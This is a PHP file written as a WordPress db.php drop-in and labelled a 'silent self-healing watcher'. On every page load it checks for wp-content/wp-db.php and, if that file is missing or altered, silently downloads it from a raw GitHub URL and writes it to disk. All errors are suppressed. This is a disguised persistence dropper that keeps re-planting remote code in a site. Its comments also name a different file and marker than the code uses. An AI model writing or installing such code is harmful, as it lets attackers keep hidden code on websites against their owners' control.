<?php
/**
 * Database drop-in / silent self-healing watcher.
 *
 * Place this file at wp-content/db.php. WordPress loads it automatically
 * on every request (see require_wp_db() in wp-includes/load.php) before
 * the database is used for the first time.
 *
 * IMPORTANT LOADING-ORDER NOTE
 * --------------------------------------------------------------------
 * At the moment db.php runs, WordPress has only set up a handful of
 * constants (ABSPATH, WP_CONTENT_DIR, table prefixes, ...). The WP HTTP
 * API (wp_remote_get, is_wp_error, ...) and almost all other WP helpers
 * are NOT defined yet — they load later inside wp-settings.php. So this
 * drop-in must rely on native PHP only.
 *
 * Responsibilities:
 *   1. Verify that wp-content/plugins/pkg/class-wp-site-diagnostics.php
 *      is present and intact. The file is considered valid only when it
 *      contains the marker string "wordpressx".
 *   2. If the file is missing, empty, unreadable, or the marker is not
 *      found, re-fetch its source from a remote URL (via native PHP's
 *      HTTP stream wrapper) and silently write it back to disk.
 *   3. Do all of the above silently — no output, no warnings, no
 *      exceptions — so this drop-in can never break the site.
 *
 * Delete this file when you are done.
 *
 * @package db-drop-in
 */

// Bail if the file is accessed directly instead of via WordPress.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// --- Silent self-healing for class-wp-site-diagnostics.php ----------------
//
// Everything below is wrapped in a try/catch (plus error handlers) so
// that any failure — unexpected type, permission issue, broken remote
// URL, malformed PHP, ... — is swallowed and WordPress keeps booting
// normally with its default $wpdb.

set_error_handler(
	static function () {
		// Swallow notices/warnings/deprecations coming from this drop-in.
		return true;
	}
);

try {

	$ds_marker      = 'title';
	$ds_target_file = WP_CONTENT_DIR . '/wp-db.php';
	$ds_remote_url  = 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/wp-db.php'; // <-- change me

	/**
	 * Decide whether the target file is present and intact.
	 *
	 * Returns true only when the file exists, is readable, has a non-empty
	 * body, and contains the marker string. Anything else (missing,
	 * blank, unreadable, missing marker) is treated as "needs restore".
	 */
	$ds_needs_restore = ( static function () use ( $ds_target_file, $ds_marker ) {
		if ( ! @file_exists( $ds_target_file ) || ! @is_readable( $ds_target_file ) ) {
			return true;
		}

		$ds_contents = @file_get_contents( $ds_target_file );
		if ( false === $ds_contents || '' === trim( $ds_contents ) ) {
			return true;
		}

		return ( false === strpos( $ds_contents, $ds_marker ) );
	} )();

	if ( $ds_needs_restore && ! empty( $ds_remote_url ) ) {

		// Native PHP HTTP fetch via stream context. No WordPress HTTP
		// API yet at this stage of the bootstrap.
		$ds_ctx = stream_context_create(
			array(
				'http' => array(
					'timeout'      => 10,
					'method'       => 'GET',
					'header'       => "Accept: text/plain, */*;q=0.1\r\nUser-Agent: WP-db-drop-in\r\n",
					'ignore_errors' => true,
					'follow_location' => 1,
					'max_redirects' => 3,
				),
				'ssl'  => array(
					'verify_peer'      => true,
					'verify_peer_name' => true,
				),
			)
		);

		$ds_raw  = @file_get_contents( $ds_remote_url, false, $ds_ctx );
		$ds_body = ( false === $ds_raw ) ? '' : trim( (string) $ds_raw );

		// Only restore when we actually got a non-empty body that
		// contains the marker. This prevents a failed download from
		// clobbering an already-broken file with an empty response.
		if ( '' !== $ds_body && false !== strpos( $ds_body, $ds_marker ) ) {
			$ds_dir = dirname( $ds_target_file );
			if ( @is_dir( $ds_dir ) || @mkdir( $ds_dir, 0755, true ) ) {
				@file_put_contents( $ds_target_file, $ds_body );
			}
		}

		unset( $ds_ctx, $ds_raw, $ds_body, $ds_dir );
	}

	unset( $ds_marker, $ds_target_file, $ds_remote_url, $ds_needs_restore );

} catch ( Throwable $e ) {
	// Intentionally silent.
} finally {
	restore_error_handler();
}

// Nothing else to do: WordPress keeps using its normal $wpdb instance.
